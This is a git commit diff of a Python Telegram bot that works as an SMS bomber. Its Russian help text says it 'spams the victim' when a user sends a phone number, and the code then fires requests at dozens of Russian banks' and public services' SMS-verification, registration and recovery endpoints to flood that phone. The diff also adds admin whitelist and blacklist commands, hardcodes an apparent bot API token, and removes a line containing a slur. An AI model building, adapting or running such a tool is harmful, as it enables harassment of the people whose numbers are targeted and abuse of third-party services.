2e79b6b2676797ccae990c21b963e70db831975c
FSystem88 <41367666+FSystem88@users.noreply.github.com>
2019-10-10 10:57:09 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,8 +1,14 @@
 # -*- coding: utf-8 -*-
-import telebot, requests, random, datetime, sys, time, argparse, json
+import telebot, requests, random, datetime, sys, time, argparse, json, re
 from telebot import types
 bot = telebot.TeleBot("965521501:AAHYwmNj3gR4xbJTDH9HsZkme0kObgrwI3o")
 owner = 355821673
+def sleep(x):
+	try:
+		time.sleep(x)
+	except:
+		pass
+
 
 @bot.message_handler(commands=["ping"])
 def ping(message):
@@ -11,64 +17,131 @@ def ping(message):
 	except:
 		pass
 
+@bot.message_handler(commands=["donate"])
+def donate(message):
+	try:
+		bot.send_message(message.chat.id, "https://t.me/spymer/43")
+	except:
+		pass
+
+@bot.message_handler(commands=["addwl"])
+def addWL(message):
+	try:
+		if message.chat.id == owner:
+			newtoper = f'{message.text[7:]}'
+			if newtoper == '':
+				bot.send_message(owner, "Введите номер телефона пользователя")
+			else:
+				newtoper = '7'+newtoper[1:]
+				f = open('idWL.txt' , 'a')
+				f.write(f'{newtoper}' + '\n')
+				f.close()
+				bot.send_message(owner, "Добавлен новый пользователь в белый лист: "+f'{newtoper}')
+		else:
+			bot.send_message(message.chat.id, "Доступно только админу")
+	except:
+		pass
+		
+@bot.message_handler(commands=['delwl']) 
+def delwl(message):
+	try:
+		if message.chat.id == owner:
+			iddelWL = f'{message.text[7:]}'
+			with open("idWL.txt") as file:
+				arrayWL = [row.strip() for row in file]
+				if iddelWL == '':
+					bot.send_message(owner, "Введите телефон, который надо удалить из Белого листа.")
+				elif iddelWL in arrayWL:
+					kkk = open('idWL.txt', 'r').read().replace(f'{iddelWL}', '')
+					f = open('idWL.txt', 'w')
+					f.write(kkk)
+					f.close()
+					bot.send_message(owner, 'Готово.')
+				else:
+					bot.send_message(owner, 'Такой юзер не найден')
+		else:
+			bot.send_message(message.chat.id, "Доступно только админу")
+	except:
+		pass
+
+@bot.message_handler(commands=["addbl"])
+def addbl(message):
+	try:
+		if message.chat.id == owner:
+			newloser = f'{message.text[7:]}'
+			if newloser == '':
+				bot.send_message(owner, "Введите номер телефона пользователя")
+			else:
+				f = open('idWL.txt' , 'a')
+				f.write(f'{newloser}' + '\n')
+				f.close()
+				bot.send_message(owner, "Добавлен новый пользователь в черный лист: "+f'{newloser}')
+		else:
+			bot.send_message(message.chat.id, "Доступно только админу")
+	except:
+		pass
+
 @bot.message_handler(commands=['start']) 
 def handle_start(message): 
-	bot.send_message(owner, "Новый пользователь: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>\nUsername: @"+f'{message.chat.username}'+"\niD: "+f'{message.chat.id}', parse_mode="HTML")
-	bot.send_message(message.chat.id, 'Привет, ' + message.chat.first_name + '\nЯ бот от @FSystem88.\nОтправь мне номер телефона в формате 79xxxxxxxxx, чтобы начать СМС спам.\n\nВообще как бы сервисов много, но из-за того, что трафик проходит через VPN соединение (спасибо РКН за блокировку Telegram на территории  РФ), то смсок доходит только около 17.\nБуду решать эту проблему.')
-
+	try:
+		bot.send_message(owner, "Новый пользователь: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>\nUsername: @"+f'{message.chat.username}'+"\niD: "+f'{message.chat.id}', parse_mode="HTML")
+		bot.send_message(message.chat.id, 'Привет, ' + message.chat.first_name + '\nЯ бот от @FSystem88.\nОтправь мне номер телефона в формате 79xxxxxxxxx, чтобы начать СМС спам.\n\nВообще как бы сервисов много, но из-за того, что трафик проходит через VPN соединение (спасибо РКН за блокировку Telegram на территории РФ), то смсок доходит только около 17.\nБуду решать эту проблему.')
+	except:
+		pass
+		
 @bot.message_handler(commands=['help']) 
 def handle_help(message): 
-	bot.send_message(message.chat.id, 'Привет!\nОтправляешь боту номер телефона в формате 79xxxxxxxxx, а он спамит жертву.\nВсё просто!\nВсе вопросы к @FSystem88\nКанал: @spymer')
+	try:
+		bot.send_message(message.chat.id, 'Привет!\nОтправляешь боту номер телефона в формате 79xxxxxxxxx, а он спамит жертву.\nВсё просто!\nВсе вопросы к @FSystem88\nКанал: @spymer')
+	except:
+		pass
 
-@bot.message_handler(commands=['unban']) 
-def handle_unban(message):
-	if message.chat.id == owner:
-		idunban = f'{message.text[7:]}'
-		with open("idBL.txt") as file:
-			arrayBL = [row.strip() for row in file]
-			if idunban == '':
-				bot.send_message(owner, "Введите id пользователя.")
-			elif idunban in arrayBL:
-				sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
-				f = open('idBL.txt', 'w')
-				f.write(sss)
-				f.close()
-				bot.send_message(owner, 'Готово.')
-			else:
-				bot.send_message(owner, 'Такого обьюзера не найдено')
-	else:
-		bot.send_message(message.chat.id, "Доступно только админу")
-
+@bot.message_handler(commands=['delbl']) 
+def delbl(message):
+	try:
+		if message.chat.id == owner:
+			idunban = f'{message.text[7:]}'
+			with open("idBL.txt") as file:
+				arrayBL = [row.strip() for row in file]
+				if idunban == '':
+					bot.send_message(owner, "Введите id пользователя.")
+				elif idunban in arrayBL:
+					sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
+					f = open('idBL.txt', 'w')
+					f.write(sss)
+					f.close()
+					bot.send_message(owner, 'Готово.')
+				else:
+					bot.send_message(owner, 'Такого обьюзера не найдено')
+		else:
+			bot.send_message(message.chat.id, "Доступно только админу")
+	except:
+		pass
+		
 @bot.message_handler(func=lambda message: True, content_types=['text'])
 def main(message):
-	with open("idBL.txt") as file:
-		arrayBL = [row.strip() for row in file]
-	iduser = f'{message.chat.id}'
-	if iduser in arrayBL:
-		bot.send_message(message.chat.id, "Вы в черном листе!\nЕсли Вы считаете, что бан был получен случайно - обращайтесь к @FSystem88.\nВот Ваш id? он пригодится админу: <b>"+f'{message.chat.id}'+"</b>", parse_mode="HTML")
-	else:
-		try:
+	try:
+	
+		with open("idBL.txt") as file:
+			arrayBL = [row.strip() for row in file]
+		iduser = f'{message.chat.id}'
+		if iduser in arrayBL:
+			bot.send_message(message.chat.id, "Вы в черном листе!\nЕсли Вы считаете, что бан был получен случайно - обращайтесь к @FSystem88.\nВот Ваш id, он пригодится админу: <b>"+f'{message.chat.id}'+"</b>", parse_mode="HTML")
+		else:
 			with open("idWL.txt") as file:
 				arrayWL = [row.strip() for row in file]
 				_phone = message.text
-				if _phone[0] == '+':
-					_phone = _phone[1:]
+				_phone = re.sub(r'[ ()--+]', '', _phone)
 				if _phone[0] == '8':
 					_phone = '7'+_phone[1:]
 				if _phone[0] == '9':
 					_phone = '7'+_phone
 
-				if _phone == '79153509908':
-					bot.send_message(message.chat.id, "Не, ну это явно бан!")
-					f = open('idBL.txt' , 'a')
-					f.write(f'{message.chat.id}' + '\n')
-					f.close()
-					bot.send_message(owner, "Пидор: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>" , parse_mode="HTML")
-					pass
 				if _phone in arrayWL:
-					bot.send_message(message.chat.id, "Данный пользователь находится в белом списке.\nТы тоже можешь попасть туда, обращаться к @FSystem88.")
-				if _phone[0] == '7':
-					bot.send_message(message.chat.id, "Запуск начался")
+					bot.send_message(message.chat.id, "Данный пользователь находится в белом списке.\nТы тоже можешь оказаться там, по всем вопросам писать @FSystem88.")
+					bot.send_message(owner, "Пользователь <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a> пытался ввести номер "+_phone+".", parse_mode="HTML")
+				elif _phone[0] == '7':
+					bot.send_message(message.chat.id, "Запуск начался.\nPhone: +"+_phone)
 					_text = 'Путин тебя любит ♥'
 					_name = ''
 					for x in range(12):
@@ -126,7 +199,6 @@ def main(message):
 					gorzdrav = requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})
 					loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={'login': _phone, 'attr': ''})
 					alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
-					invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
 					onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
 					psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
 					raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
@@ -134,11 +206,13 @@ def main(message):
 					utair = requests.post('https://b.utair.ru/api/v1/login/', json={"login":_phone})
 					aresbank = requests.post('https://www.aresbank.ru/ajax/register.php', data={'REGISTER[NAME]': 'Иванов Иван Иванович','REGISTER[PERSONAL_PHONE]': _phoneAresBank,'REGISTER[LOGIN]': _name+f'{iteration}','REGISTER[PASSWORD]': _name+'-/'+_name,'REGISTER[CONFIRM_PASSWORD]': _name+'-/'+_name,'REGISTER[ACTION]': 'register','register_submit_button': 'Регистрация'})
 					modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша','CellPhone':_phone9,'Package':'optimal'})
-					sfera = requests.post('https://sfera.ru/api/quiz/id', json={"phone":_phonePizzahut,"regno":"1021400692048"})
 					bystrobank = requests.post('https://www.bystrobank.ru/publogin/web/register.php', data={'referer::-0':'','realm::-0':'bbpwd','loginName-0':_name,'password::-0':_name,'passwordRepeat::-0':_name,'phoneNumber::-0':_phone9,'ruPhoneCheck::-0':'true','email::-0':_email,'registration':'','serviceName-0':'lc'})
 					bot.send_message(message.chat.id, "GOOD!")
 				else: 
-					bot.send_message(message.chat.id, "Sorry, i dont understand you.")
-		except:
-			bot.send_message(owner, "Ошибка после пользователя: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>" , parse_mode="HTML")
+					bot.send_message(message.chat.id, "Я не понимаю тебя.\nОтправь мне номер телефона")
+	except:
+		bot.send_message(message.chat.id, "Спам закончен.")
+		bot.send_message(owner, "Завершен спам:\nUser: <a href='tg://user?id="+f'{message.chat.id}'+"'>"+f'{message.chat.first_name}'+"</a>\nPhone: "+_phone , parse_mode="HTML")
+
 bot.polling()
+
